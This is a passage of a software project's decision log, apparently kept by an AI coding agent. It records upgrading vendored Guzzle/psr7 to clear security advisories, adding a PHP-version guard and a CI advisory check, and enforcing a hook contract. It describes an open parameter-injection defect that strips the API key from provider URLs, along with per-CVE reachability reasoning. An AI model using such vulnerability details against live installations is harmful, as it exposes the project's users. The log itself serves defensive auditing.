- **Why this is not re-opening D-029, which would be out of order:** D-029 records two things that no longer agree. It fixes the target as *"bump guzzle ≥ 7.12.1 and psr7 ≥ 2.12.1"* **and** as *"re-run `composer audit -d installer` to zero"*. Measured 2026-07-25, those floors leave **6 of 11 advisories open**: three guzzle advisories are fixed only in 7.15.1, one in 7.14.2, one in 7.12.3, and psr7's newest in 2.12.3. **L-014's rule decides it** — when a recorded remediation and a recorded acceptance criterion disagree, the criterion is the requirement and the remediation is a guess. The version numbers were one session's derivation from a 5-advisory list; "audit to zero" is the property the product must have. The criterion is honoured and the derivation is corrected.
- **Why the bump is wider than two packages, verified rather than assumed:** `guzzle 7.15.1` requires `guzzlehttp/psr7 ^2.13`, `guzzlehttp/promises ^2.5.1` and `symfony/polyfill-php80 ^1.25`. `installer/vendor-ai/symfony/` currently holds only `deprecation-contracts` and `polyfill-mbstring`, so the polyfill is genuinely new. psr7 2.12.3 would clear psr7's own advisories, but guzzle 7.15.1's `^2.13` makes 2.13.0 the resolvable answer anyway.
- **D-029's central cost claim survives, and that is what keeps this a re-vendor rather than a scope change:** `soukicz/llm` 0.5.0 — the only genuine root requirement — asks for `guzzlehttp/guzzle: ^7.9`, `guzzlehttp/psr7: ^2.7`, `guzzlehttp/promises: ^2.0` (`installer/vendor-ai/soukicz/llm/composer.json:23-31`, read directly, not taken from the lock). All three targets satisfy it. No dependency-tree surgery.
- **The PHP floor does not move, so this decision does not touch the support matrix.** The 8.3 requirement comes from `soukicz/llm` (`php: >=8.3`), which is untouched; `config.platform.php = 8.3.0` and the generated `vendor-ai/composer/platform_check.php` regenerate identically. NEW-06 is neither created nor closed by the bump — it is closed on its own merits (D-053).
- **D-029's stated command is wrong and is corrected here rather than followed:** it says `composer install -d installer`, which installs *what the lock already says* and would reinstall 7.10.0. The pins are hand-edited in `installer/composer.json` first, then `composer update`. They must remain **exact versions with no operator**, because `VendorAiManifestTest::normalise()` strips only a leading `v` — a constraint written `^7.15` fails `assertSame` against the vendored `7.15.1`.
- **The reachability assessment is redone from scratch, not inherited, and it changes one recorded conclusion.** D-029's assessment turned on *"no cookie jar, no user-controllable URL in the AI module"*, which does not cover the new URI/host-parsing advisories. Re-derived, with every decisive claim re-verified by hand after a subagent reported it (L-013):
  - **The feared NEW-15 adjacency does not exist.** `installer/core/safe-http.php` and `installer/core/http-client.php` contain **zero** references to `GuzzleHttp` or `Psr\Http` — they are pure first-party parsing (`parse_url`, `filter_var`, `inet_pton`, `gethostbynamel`, `dns_get_record`) over cURL and stream transports. "Host confusion via authority reinterpretation" needs one URL parsed by two different parsers, and the two stacks never share a URL. **CVE-2026-59882 and CVE-2026-48998 have no bearing on the SSRF control**, which is the specific question this slice was told to answer rather than inherit.
  - **Cookies (4 advisories): no path.** The string `cookie` occurs nowhere in `installer/core/ai/` or `installer/vendor-ai/soukicz/llm/`; Guzzle's default is `'cookies' => false` (`vendor-ai/guzzlehttp/guzzle/src/Client.php:236`) and the jar is built only on `=== true` (`:260-261`).
  - **Proxy (2 advisories): no attacker-reachable path.** Nothing sets `proxy`; the env read is SAPI-guarded for `HTTP_PROXY`, and no request header can produce a `$_SERVER` key named exactly `HTTPS_PROXY` under CGI. Operator misconfiguration only — which is what D-029 already said about CVE-2026-55568 and what this bump fixes.
  - **Referer/fragment: no path** (`allow_redirects` defaults `'referer' => false`, the header is stripped, no caller overrides it). **URI/host parsing: no exploitable path** — all five provider authorities are hardcoded literals and `chat-engine.php`'s `default => throw` pins the provider enum.
  - The only first-party Guzzle references repo-wide are two **catch clauses** (`installer/core/ai/chat-engine.php:197`, `:216`) — exception types, not URLs.
- **Stated plainly rather than softened: none of the 11 advisories has a demonstrated exploitation path in Klytos.** The bump happens because a self-updating CMS with a real installed base should not ship known-vulnerable dependencies and D-029 set a closing date — not because an exploit was found. Saying otherwise to justify the work would be the L-002 defect.
- Alternatives rejected (and why): **the literal D-029 floors** (7.12.1 / 2.12.1 — smallest diff, no third package, no seventeenth package; rejected because `composer audit` would still report 6 advisories afterwards, so NEW-05 could not close and a second remediation would immediately queue behind the first); **guzzle 7.12.3 + psr7 2.12.5** (clears three more and still leaves four — there is no middle target that reaches zero, because the highest floor is 7.15.1); **guzzle 8.0.0** (exists, and `soukicz/llm`'s `^7.9` forbids it — that *would* be the dependency-tree rewrite D-029 ruled out); **accept permanently** (rejected on the same grounds D-029 rejected it — nothing in this project's triage has been written off as permanent).
- Supersedes: the version numbers and the `composer install` command in **D-029** only. D-029's shape, its rationale, its Estimate requirement and its rejection list all stand.
- **Implemented in slice 1 (2026-07-25), with three mechanism notes and one number corrected — outcome unchanged.**
  - **`composer audit -d installer` → `No security vulnerability advisories found.`** Resolution was exactly as planned: *1 install, 3 updates, 0 removals* — guzzle 7.10.0→7.15.1, promises 2.3.0→2.5.1, psr7 2.9.0→2.13.0, plus `symfony/polyfill-php80 v1.37.0`. **No unintended package moved**, verified by listing the changed directories rather than assuming the exact pins held. The two files that carry the fixes — `guzzle/src/Handler/ProxyEnvironment.php` and `psr7/src/Rfc3986.php` — are physically present in the tree.
  - **The diff is 95 files, not 482, and that correction matters because 482 was the argument.** D-029 called this "a change across 482 tracked files" and used that figure to justify treating remediation as a scope change rather than a slice. 482 is the size of the whole vendored tree; the change is **95 files across `installer/`** — of which **93 are under `vendor-ai/` (27 added, 66 modified, 0 deleted)** and the other two are `installer/composer.json` and `installer/composer.lock`. *(The two scopes are stated explicitly because 27+66+0 = 93, not 95, and a reader re-deriving the figure per L-015 would otherwise hit an apparent contradiction — caught by the slice's own `code-reviewer` pass.)* The tree grows 482 → **509** tracked files. Nobody had measured it — the number was carried from the tree size to the change size and reused as a cost argument (L-015: a number copied from another document is not a measurement). The decision to give this its own slice was still right, for the *verification* reason D-029 also gave; the file count simply was not the evidence for it.
  - **`installer/composer.json` gains `"version": "1.0.0"`, and it is load-bearing rather than tidy.** Left alone, Composer resolved the root package's identity from git and wrote `'pretty_version' => 'dev-develop'` plus `'reference' => '<current commit sha>'` into the **tracked**, generated `vendor-ai/composer/installed.php`. That makes a tracked artifact depend on the branch name and the commit it happened to be regenerated at — directly against this manifest's own recorded purpose ("reproduced byte-for-byte", D-028). Pinning the root version restores `'pretty_version' => '1.0.0'` and `'reference' => null`, so the file is a function of the dependency set and nothing else.
  - **The drift guard had a hardcoded assumption that had never been exercised, and this is the transferable part.** `VendorAiManifestTest::vendoredVersions()` skipped the root package by the literal string `'__root__'`. That is only what Composer writes for a root package it *cannot name*; this manifest has a name, so the first `composer update` this repository has ever actually run renamed the entry to `klytos/vendor-ai-manifest` and the root leaked into all three comparisons. The guard was built by D-028 against a tree that had been vendored **elsewhere** and was explicitly never regenerated here (slice 2's own test point asserted "`vendor-ai/` unmutated"), so the assumption rode along untested for three sprints. Fixed by reading `$installed['root']['name']` — the documented intent, implemented rather than approximated. **Not a loosening:** both set comparisons stay `assertSame` in both directions, and a vendored package cannot collide with the root name because Composer refuses to install a package named after its own root. Recorded as **L-020**.
  - **The prove-it-fails cycle came free from the real work (L-016).** `VendorAiManifestTest` was observed failing on **all three** methods against the half-updated records, then green once each of the four was reconciled — no injected fault was needed. The new `tests/Integration/VendorAiCompatibilityTest.php` was proven to fail in two directions by probe (an unresolvable symbol; a URL psr7 normalises), and its cookie assertion was proven to read a property that genuinely can be non-`false` (`new Client(['cookies' => true])` yields a `CookieJar`), so it is not an assertion that can only ever pass.
- **Review amendment (2026-07-25, before commit — L-015): both subagents ran on the finished diff, docs included, and neither returned a blocking finding.** Recorded rather than folded in silently, because two of the four outcomes are corrections to my own text and one is a correction to a claim in this decision.
  - **`security-auditor`: no blocking findings, and the reachability verdict was re-derived rather than accepted.** It reproduced the "no path" conclusion independently for all three families it could test by inspection — cookies (`grep -i cookie` across `installer/core/ai/` and `soukicz/llm/src/` → zero; `Client::configureDefaults()` sets `'cookies' => false` and builds a jar only on `=== true`), proxy (`HttpClientFactory::createClient()` sets only `headers` and `handler`), referer (`RedirectMiddleware::$defaultSettings` has `'referer' => false` and the header is actively removed when not enabled) — and confirmed **zero** `GuzzleHttp`/`Psr\Http` references in `safe-http.php` and `http-client.php`, so the differential-parsing precondition for the host-confusion CVEs genuinely does not exist. It also confirmed the supply-chain checks: none of the four touched packages declares Composer `scripts`, and `exec`/`shell_exec`/`eval`/`base64_decode` appear nowhere in them.
  - **It found the `model` parameter defect is real and TWO of my framings of it were wrong.** Re-verified myself by running the encodings rather than taking either the reviewer's or my own word (L-013): a `#` in `$input['model']` pushes `:generateContent?key={apiKey}` into the URI **fragment**, which PSR-7 never puts on the wire — so the request reaches Google with **no API key at all**; a `?` pulls the same substring into the query and truncates the path. The **host never moves** in any spelling and CRLF is percent-encoded, so there is no header injection and no authority takeover. And the population is **not** "authenticated admin": `api/ai-chat.php` is gated at `ai.use`, which **D-051 widened to `editor`** — so editor and above. Recorded as its own audit finding with a trigger; not fixed here (adjacent subsystem, D-031's narrowing).
  - **`code-reviewer`: no blocking findings, and it caught a real precision defect in this decision — "95 files" and "27 added, 66 modified, 0 deleted" sum differently (93) because they are two different scopes.** Both figures were correct and their juxtaposition was not; a reader re-deriving them per L-015 would hit an apparent contradiction and have to consult a third document to resolve it. Corrected here and in the audit entry by naming the scope of each. It also caught that a comment in the new test said "three of the fourteen" are interfaces when four are — an uncounted number, in the same class, corrected.
  - **Confirmed sound against source rather than merely read:** the `VendorAiManifestTest` change is a correctness fix and not a loosening (a vendored package cannot collide with the root name, and a wrong root name still trips the set comparison rather than passing silently); `"version": "1.0.0"` has no effect on `composer audit`, resolution or the lock's `content-hash`; `REQUIRED_SYMBOLS` is **complete** — the reviewer re-ran the regeneration command in the test's own docblock and matched all 14; and `VendorAiCompatibilityTest::setUp()` registers no hook and writes no config, so it leaks into neither the D-042 hook baseline nor the D-039 config guard.
  - **One count reconciled rather than left as a discrepancy:** the filesystem holds **510** files under `vendor-ai/` against **509** tracked. The extra is `installer/vendor-ai/swaggest/json-schema/composer.lock`, excluded by `.gitignore:120` (`installer/vendor-ai/**/composer.lock`) — a pre-existing, deliberate rule, not drift.
  - **Both reviewers ran without a shell this session** and said so unprompted. That limit is recorded rather than glossed: neither could execute `git diff` or byte-compare against `HEAD`, so the file-count bookkeeping and the before/after `Client.php` comparison rest on measurements taken in the main session, not on an independent second run. Where the reviewers *could* verify by reading — the four-record agreement, the symbol list, the reachability greps — they did, and their conclusions are recorded above as their own.

## D-053 — The AI stack refuses an unsupported PHP before loading it, and advisories get standing detection in CI
- Date / phase: 2026-07-25 / Phase 5, Sprint 3 slice 2 (both halves were user decisions, taken at the sprint kickoff before anything was written)
- Decision: **(a)** `App::getChatEngine()` checks `PHP_VERSION_ID` **above** the `require_once` of `installer/vendor-ai/autoload.php` and throws a typed `Klytos\Core\Ai\UnsupportedRuntimeException` with a translated message when the runtime is below the vendored AI stack's floor. **(b)** `.github/workflows/ci.yml` gains a `vendor-advisories` job running `composer audit -d installer` with `continue-on-error: true`, so the current advisory list is printed on every CI run without failing the build.
- **Why (a) is a real defect and not tidying — audit NEW-06.** The old guard was `file_exists()`: a **presence** check standing in for a **version** check. Below PHP 8.3 the file exists, the require proceeds, and Composer's generated `platform_check.php` — required unconditionally by `autoload_real.php:25` — sends `HTTP/1.1 500`, echoes *"Composer detected issues in your platform"* **into the response body**, and throws a bare `\RuntimeException`. All of that happens inside vendored code, so the operator gets a 500 carrying third-party text with no indication that AI chat is the feature at fault or that the rest of the CMS is fine. Keel's "external dependencies fail safe" rule requires the opposite, and this was the only place in the product violating it.
- **Placement is the load-bearing part, and it is bounded on one side absolutely.** The guard cannot go below the `require_once`: by then `platform_check.php` has already fired, so a guard there is dead code that still reviews clean. Because no runtime test on a supported host can reach that branch, the ordering is pinned by a test that reads the source (`AiRuntimeGuardTest::testTheGuardRunsBeforeTheVendoredAutoloaderIsRequired`) — the same technique D-046 used to establish that the MCP gate sits above the `mcp.handle_tool` filter. **Proven by relocating the guard below the require and watching that test fail with its intended message, then reverting.**
- **The policy is a pure static, and that is not a style preference.** `App::aiRuntimeUnsupportedReason( int $phpVersionId ): ?string` takes the version as a parameter because **PHP cannot be downgraded inside the test suite**. A guard reading `PHP_VERSION_ID` directly would own a branch no test could ever reach — indistinguishable from a branch that *cannot* fire, which is L-010's failure mode. This is exactly the split D-044 made for `Auth::buildSecurityHeaders()`, for exactly the same reason. It returns a stable machine reason rather than a sentence (the `SafeHttp` `REASON_*` convention, D-041), so the caller owns the wording and the policy needs no I18n service to be testable.
- **The floor is written once and mechanically tied to its source.** `App::AI_MIN_PHP_VERSION_ID = 80300` has two upstream origins — `soukicz/llm`'s `"php": ">=8.3"` and the generated `vendor-ai/composer/platform_check.php` — and a test asserts the constant equals the value Composer actually generated. A future re-vendor that moves the floor therefore fails the suite rather than reaching a user as a 500. **The D-052 re-vendor did not move it**: `soukicz/llm` was untouched, so `platform_check.php` regenerated identically.
- **An action, never a filter** (`ai.runtime_unsupported`, carrying reason + required + running). A listener that could reverse this decision would be a listener that re-enables the fatal — the same reasoning behind `auth.access_denied` (D-032) and `http.safe.blocked` (D-041). **Nothing in core subscribes to it, and `docs/reference/ai-runtime.md` says so in those words**: L-019 was recorded because "it goes to the audit log" was true of a hook and false of the system, so this document states the seam/sink distinction at the moment of writing rather than waiting for a fresh-context pass to find it.
- **Why (b) is in this sprint at all.** The advisory count on the *same pinned versions* grew **5 → 11** between 2026-07-19 and 2026-07-24 and nothing detected it — it was noticed by hand at a sprint close, five days late, and it is the reason D-029's recorded floors had gone stale (D-052). Remediating without closing the detection gap would guarantee the same surprise next time.
- **Why the CI job does not fail the build, and why it is not a keel-verify check.** An advisory lands when *upstream publishes it*, not when someone pushes a commit, so a hard failure turns an unrelated pull request red for a reason its author cannot fix — and a check that cries wolf is one people learn to ignore, which is precisely the argument D-045 recorded for keel-verify's WARN tier. It stays out of `scripts/keel-verify` for a second reason: that script must keep working offline, and a network-dependent check would either fail or **go quiet** without a network — the failure mode L-010 and L-016 both record. Remediation stays a triaged user decision (D-022's standing rule), which is what produced D-029 and D-052 in the first place.
- Alternatives rejected (and why): **wrap the `require_once` in try/catch instead of guarding above it** (smaller diff and superficially equivalent — but `platform_check.php` has already sent a 500 and echoed into the body by the time it throws, so the response is corrupted before anything can be caught; and catching a bare `\RuntimeException` there would swallow unrelated autoload failures); **raise the product's PHP floor to 8.3** (makes the mismatch disappear rather than handling it — a support-matrix change for a released product with an installed base, which belongs to D-027's trigger, not to a CVE sprint); **let `aiRuntimeUnsupportedReason()` read `PHP_VERSION_ID` itself** (one less parameter, and an untestable branch); **a filter to override the floor** (rejected outright — overriding it produces the fatal it exists to prevent); **a hard-failing CI check** (strongest signal, and the one most likely to be disabled the first time it blocks unrelated work); **a keel-verify check** (more consistent with checks 8 and 9, and it would make keel-verify network-dependent for the first time).
- **Docs granularity, recorded so it does not read as an omission:** `docs/api/INDEX.md` gained rows for the exception class and the action, but **not** for `App::AI_MIN_PHP_VERSION_ID` or `App::aiRuntimeUnsupportedReason()`. The INDEX lists classes, not their methods — no method row exists for any class in the file, `App::getChatEngine()` included — so adding two would break the established granularity rather than follow it. Both surfaces are documented in `docs/reference/ai-runtime.md` with runnable examples.
- **The refusal branch was driven end to end, and the first draft of this decision understated what could be proven.** It said the branch was unreachable on a supported host. The runtime cannot be lowered — but the **floor can be raised**, and temporarily setting `AI_MIN_PHP_VERSION_ID = 99999` drives the real path. That probe established four things nothing else did: the exception is the typed one; **`__()` resolves in the throwing path**, returning the catalogue value with both placeholders substituted rather than a raw key or an "undefined function" fatal (the sharpest risk here — NEW-18 means the *global* `__()` exists only under `admin/`, and one of the three callers is an MCP tool that never loads `admin/bootstrap.php`); the action fires **before** the throw and cannot influence it; and `GuzzleHttp\Client` is **not loaded**, which is a *runtime* proof of the ordering independent of the source-order assertion. The message half is now pinned permanently by `testTheRefusalMessageResolvesAndSubstitutesBothPlaceholders()`, proven to fail by removing the `ai` domain from `en.json` — `I18n::get()` returns the key verbatim on a miss, so "not the key" is exactly the right property to assert. **What is still unproven and is not claimed:** nobody has run this on a real PHP 8.1/8.2 host. Every property has been observed with the floor moved, not the runtime moved; the two differ only in the one value the policy reads, so the gap is small but real.
- **Review amendment (2026-07-25, before commit — L-015): the `security-auditor` returned no blocking findings, corrected one assumption in this decision, and found a second instance of a defect class this sprint had only recorded once.**
  - **The disclosure assumption was wrong in its premise and right in its conclusion.** This decision implied the refusal message is mostly logged; in fact **all three callers echo `$e->getMessage()` back to the caller** (`admin/api/ai-chat.php:333`, `admin/api/translations-ai.php:140`, `core/mcp/tools/translation-tools.php:282`). It is still fine, for a reason worth recording rather than assuming: `PHP_VERSION` is **already printed on the admin dashboard** (`admin/index.php:103`), which is gated at `pages.view` — held by **all four roles, viewer included** — while the three new callers are gated at `ai.use` (owner/admin/editor, D-051) or `site.configure` (owner/admin). The new message's audience is a strict **subset** of the audience that already sees the same value, and the required version is a public constraint in a committed `composer.json`. Conclusion unchanged, premise corrected.
  - **The old behaviour was the WORSE disclosure, which strengthens rather than merely permits this change.** `platform_check.php` set `HTTP/1.1 500` and **echoed** the message plus `PHP_VERSION` into the response body whenever `display_errors` is off — unconditionally, outside any `try/catch` a caller could interpose, corrupting whatever JSON body the caller was building. The new path emits one clean `jsonResponse(..., 500)`.
  - **Fail-open re-derived independently and found closed:** one call site for the vendored autoload repo-wide; the guard unconditional above it; `klytos_do_action()` returns `void` so no listener can alter control flow; `$this->chatEngine` assigned in exactly one place.
  - **The CI job is clean and inherits the existing hardening** — `pull_request` not `pull_request_target`, top-level `permissions: contents: read` with no job-level elevation, no secrets, no `github.*` interpolation into any `run:` block, and `continue-on-error` scoped to this job alone. **One property named rather than left implicit:** because the job always reports green, wiring it into required-status-check branch protection under the reading "green = no advisories" would be false. It is named `(report only)` and the trade-off is documented in-file, so this is an accepted design choice — recorded here so a future reader does not mistake it for a gate.
  - **It found a SECOND instance of NEW-34's defect class, plus the systemic reason for it — recorded as NEW-35 after independent verification.** `ToolRegistry::call()` performs the authorization gate, the plugin filter and the handler invocation, and **never validates `$params` against the tool's `inputSchema`** — read the method end to end to confirm it, rather than taking the report. So every `enum`/`type`/`required` a tool publishes is advisory, and `installer/core/ai-image-generator.php:62` interpolates an unvalidated `model` into a provider URL exactly as the chat path does, reachable over MCP via `klytos_generate_image`. The systemic half is the important one: fixing the interpolation alone would leave every other tool's declared contract unenforced. Not fixed here — it is outside this sprint's diff and enforcing schemas is a **behaviour change for every MCP client**, which needs the D-034 treatment.
  - **It also closed three angles on NEW-34 that I had not checked**, each verified against source: the OpenAI-compatible providers carry the model in the JSON body, not the URL, so the vector does not exist there; an unknown `provider` cannot be paired with a live key; and `klytos_translate_with_ai` never forwards a caller-supplied `model`.
- Supersedes: none. Closes audit **NEW-06**; the standing-detection half closes the gap that let **NEW-05**'s advisory count grow unobserved.
- **Review amendment (2026-07-25, before commit — L-015): the `code-reviewer` returned a BLOCKING finding that was correct, and it was this slice's own subject turned against it.** Recorded in full because the shape is the transferable part.
  - **BLOCKING, and right: the two new integration tests would have turned CI's PHP 8.2 leg red.** `.github/workflows/ci.yml` runs the FULL suite on 8.2 as well as 8.3, and `installer/vendor-ai/` needs 8.3 — so any test reaching `getChatEngine()` fails there. `testThisRuntimeIsSupportedSoTheGuardMustBeTransparent()` had been written as an *assertion* that the runtime was supported, which is a **failure** on 8.2 for behaviour that is **correct** on 8.2. A slice whose entire subject is "below 8.3 must degrade gracefully" shipped tests that break the build below 8.3.
  - **Measured rather than argued, by simulating the leg instead of guessing at it:** with `AI_MIN_PHP_VERSION_ID` temporarily raised so this host counts as unsupported, **8 tests across 3 classes** broke — 2 from this slice, **3 from slice 1**, and **3 that have been latent since Sprint 2 slice 3** (`ChatEngineToolListTest`). The reviewer flagged the pre-existing pair as context; the simulation is what turned that into a count.
  - **Why it had never been observed — recorded as L-022: CI has never run.** The workflow was written in Sprint 1 slice 9 and every commit since (29 at the time of writing) is unpushed by standing instruction. A committed workflow that is never triggered checks nothing; "CI runs the same commands the test points run" was true of the file and false of the project. This is **L-019 one level out** — a seam with no subscriber and a workflow with no run fail identically.
  - **The fix is two layers, because they answer different questions, and the first choice was rejected on the record.** Simply letting the 8 tests skip does NOT work: CI promotes any skip to a hard failure (D-045), a rule that exists to catch an un-seeded playground and must keep meaning exactly that. So the 8 carry `#[Group('ai-runtime')]` and CI's 8.2 leg **excludes** them explicitly, leaving D-045's rule intact and honest; and `IntegrationTestCase::requireAiRuntime()` — built in the shape of the existing `requirePlayground()` rather than as a second mechanism — skips them for a developer running the suite locally on 8.1/8.2. The group is applied **per method** in `AiRuntimeGuardIntegrationTest`, so the one test asserting only that the refusal *message* resolves keeps running on 8.2, which is the runtime where that message is what an operator actually sees. Proven: 8 errors/failures → **8 skips**; `--group ai-runtime` selects exactly 8; `--exclude-group` leaves 198 green.
  - **NON-BLOCKING, taken: the advisory job conflated "the audit failed" with "advisories found".** Piping `composer audit` into `grep` reports GREP's status, so no network or a missing lock would have been announced as a security finding. It now captures output and exit status separately and distinguishes three outcomes — clean / advisories / **"the audit did not complete, nothing was verified"** — each proven by feeding the branch its real string. Misreporting an infrastructure failure as a finding is the same dishonesty as the reverse, in a job whose own comments cite L-016 about it.
  - **NON-BLOCKING, taken: a stale line reference this diff itself created.** Inserting ~107 lines into `app.php` moved `getChatEngine()`, leaving `app.php:1009` wrong in `docs/04-adoption-audit.md` and `docs/03-technical-plan.md`. Both now name the method instead of a line number, so the next insertion cannot rot them again.
  - **NON-BLOCKING, REFUTED — and the refutation matters more than the item.** The reviewer asked for the new exception's `parent::__construct( $message )` to drop its inner-paren spaces to match `installer/core/ai/`'s neighbours. That contradicts the **recorded** convention: `docs/03-technical-plan.md` §3 says spaces inside parentheses are the project's style and *"do not 'correct' it"*, and `.claude/rules/code-style.md` names that section as the source of truth on conflict. I applied the change before checking, then reverted it. **L-013 and L-015 in one move** — a reviewer's suggestion is a hypothesis, and the project's own recorded convention outranks a neighbouring file's habit.
  - **Confirmed sound against source by the reviewer, not merely read:** the guard's placement and completeness (one call site for the vendored autoload, no bypass); `PHP_VERSION_ID` as the right comparison; all three callers catching `\Throwable` without leaking a stack trace; **the `__()` reachability reasoning, re-derived independently** and reaching the same conclusion (resolution follows the namespace of the file where the call is written, not the caller's); all 20 catalogues structurally valid, placeholders spelled identically, and **no missing accents, ñ or ¿/¡ in any of the 20** — checked individually; and every doc figure re-derived, including the INDEX counts (101 / 308 / 957).

## D-054 — Actions are fire-and-forget, enforced at registration; page data is modified through a filter
- Date / phase: 2026-07-25 / Phase 5, Sprint 4 slice 1 (the mutation mechanism, the enforcement severity and the sprint scope were all user decisions taken at the kickoff, before anything was written)
- Decision: **(a)** `Hooks::addAction()` and `Hooks::addFilter()` reflect the callback and throw a typed `Klytos\Core\HookContractException` when it declares a **by-reference parameter**, naming the hook, the parameter position and name, and the callback's `file:line`. **(b)** `PageManager` applies a new **`page.save_data`** filter to the record immediately before it is written, on create and on update, and **above** the pre-existing `page.before_save` action — which stays, unchanged, as an observer. **(c)** `x402-bootstrap.php`'s by-reference listener becomes a filter on `page.save_data`.
- **Why the obvious fix is refuted rather than merely disfavoured, and this is the load-bearing part.** D-026 deferred NEW-03 because the fix "changes the signature of `Hooks::doAction()`". Measured this session by running PHP rather than reasoning about it: `mixed &...$args` **does** bind by reference — and then PHP refuses any **non-variable** argument with a fatal `Error`. String and integer literals, `null`, array literals, class constants, concatenations, ternaries and `??` expressions all fatal; a function-call result emits a notice. **36+ call sites pass such an argument**, starting with `PageManager::create()`'s own `'create'` literal and including nine `$page ?? null` sites in `page-editor.php`. Worse, an **undefined** array key passed to a by-reference parameter is silently *created* in the caller's array, so `doAction( 'x', $data['maybe'] )` would materialise `$data['maybe'] = null`. There is no version of the by-reference variadic that is safe here.
- **Why enforcement is a throw and not a log.** A listener silently not registered is the by-omission failure the throw exists to end — the plugin author sees nothing and the site behaves as if their code were absent. The throw is contained where it matters: `PluginLoader::loadPlugin()` wraps every plugin entry point in `try/catch (\Throwable)` and records a named load error (`plugin-loader.php:245-252`), so a third-party plugin carrying such a listener **fails to load with a readable reason rather than taking the CMS down**. Verified against source, not assumed.
- **The ordering is load-bearing and is bounded on one side.** Core is **not** covered by that catch — `x402-bootstrap.php` is required directly by `App::boot()` — so a by-reference listener in core would throw out of boot and white-screen every request. The listener was therefore converted **before** the enforcement landed, and `HooksTest::testCoreItselfRegistersNoByReferenceListener` scans `installer/core/` and fails if one ever reappears. That test is a safety interlock, not a style check, and its docblock says so.
- **Registration-time, not dispatch-time, and the cost decides it.** Shipped code holds **23** action registrations and **32** filter registrations — **55** reflections, once, at boot — against **363** action fire sites and **128** filter fire sites, many of them inside loops. Checking at dispatch would cost a reflection per callback per fire, on every request, forever.
- **The filter path is closed in the same move rather than left as the next NEW-03.** `applyFilters()` spreads its arguments into `call_user_func()`, so a `&$value` filter callback loses its write exactly as an action does. **Zero code relies on it today** (verified two ways), so the check is shared by one private helper consumed by both registries — one implementation, per the reuse rule.
- **By-reference CAPTURE (`use ( &$x )`) is unaffected**, works correctly, and is used by four existing tests. Reflection reports parameters only. Pinned by a named test, because a check that conflated the two would have refused all four and looked like a broken suite rather than a broken check.
- **A SECOND, independent defect was found by driving the feature instead of the finding (L-014), and fixed in path.** NEW-03 says the x402 post-type default "is never applied". It could never have applied even with a working hook: `admin/post-type-edit.php:73` applies `admin.post_type_edit.update_data` — the filter x402 uses to add `x402_default_enabled` — and passes the result to `PostTypeManager::update()`, whose **hardcoded 7-field allow-list silently drops it**. So the checkbox x402 renders on the post-type edit form (`x402-bootstrap.php:167`) has **never persisted**: the operator ticks it, saves, and it returns unticked. Six code sites read the value; nothing could write it. Recorded as **NEW-36**. Fixed in path because acceptance criterion 1 of this sprint is unreachable without it — the NEW-16 shape from slice 7, "in scope by necessity, not opportunism" (D-043).
- **The fix for that is an extension point, not a longer hardcoded list:** `$updatable` now passes through a new **`post_type.updatable_fields`** filter, and x402 declares its own two keys. **Omission still denies**, so no plugin widens it into mass assignment by accident — the `admin.gate_map` (D-032) / `mcp.tool_capabilities` (D-048) shape, chosen over adding `x402_default_enabled` to core's own list, which would hardcode a plugin's concern into the post-type manager.
- **`phpunit.xml` sets `failOnWarning="true"`, which the file itself named as this slice's trigger.** It was off *because* of NEW-03. Leaving it off after the fix would have discarded the evidence that proves the fix: the warning's **absence** is the user-facing outcome, and it is now asserted across all 220 tests rather than only where a test looks for it.
- **Corrections of record, measured rather than inherited (L-015).** D-026, audit NEW-03 and audit D-04 all say `doAction()` "backs **301 registered actions**". That figure does not reproduce and is wrong in kind: it is a stale copy of `docs/api/INDEX.md`'s `| Actions |` row **at commit `622d54c`**, traced through that file's history (301 → 302 → 304 → 306 → 307 → 308 at HEAD). Nothing *registers* 301 anything. Re-measured **three** ways, the last of them comment-stripped and multi-line-aware: **308** distinct action names, **363** action fire sites, **23** shipped action registrations, **120** distinct filter names, **128** filter fire sites, **32** shipped filter registrations, max **4** payload arguments. The blast radius of the by-reference defect is **one listener** — and the inflated framing is part of why it was deferred twice.
- **My own first two measurements of that surface disagreed with each other, and reconciling them found a real gap — recorded because it is L-015 turned on this very entry.** A line-based grep and a subagent's count differed on registrations (35 vs 27) and filter names (115 vs 118). Neither was wrong so much as differently scoped: one included `tests/` (where this slice's own new file added 9 registrations), the other counted the helper's own delegation line as a registration, and both missed the **4 multi-line `applyFilters()` calls** a line-based pattern cannot see. The third pass — strip comments, strip the helper definitions, match across newlines — settled it, and in doing so found that **`x402.should_protect` (`x402/gate.php:70`) was fired in code with no `docs/api/INDEX.md` row**, a pre-existing gap dating to adoption's line-based extraction. Row added; Filters **119 → 120**, total **961**. Had the numbers not been re-derived, this entry would have shipped a figure copied from a subagent report while arguing that copied figures are not measurements. Also corrected: audit NEW-03 cited `core/app.php:486` for the unconditional x402 load; the real line is `:546`, now named by method so the next insertion cannot rot it.
- Alternatives rejected (and why): **`doActionRefArray()`**, the WordPress `do_action_ref_array` shape (probed, works — rejected because it creates a *second* dispatch contract, so "may this action mutate?" depends on which method the emitter happened to call, invisible to a listener author; that is the by-omission shape S-07, NEW-02 and the tool loader were each closed to eliminate, and it would force enforcement to per-dispatch reflection); **`mixed &...$args`** (refuted above by measurement); **log and refuse to register** (a listener silently absent is the defect, not the fix); **detect nothing and fix only x402** (leaves the next by-reference listener on any of 308 names silently discarding its writes — "fix one of two identical paths", which D-041's own review cycle caught and rejected); **a `keel-verify` check for by-reference listeners** (the runtime enforcement is universal and cannot be bypassed; a static source check would duplicate it and could disagree — its absence is stated in the script header, the D-045 precedent); **adding x402's keys to core's allow-list** (hardcodes a plugin concern into core and leaves the extension point still broken for everyone else).
- Supersedes: none. Closes audit **NEW-03**; opens and closes **NEW-36** in the same slice. Discharges D-026's deferral of NEW-03 at its own recorded trigger; D-026's NEW-04 half is untouched.
- **Review amendment (2026-07-25, before commit — L-015): both subagents ran on the finished diff, docs included, and NEITHER returned a blocking finding.** Recorded rather than folded in silently, because the two reviewers **disagreed with each other** on one item and most of the rest were defects in my own text.
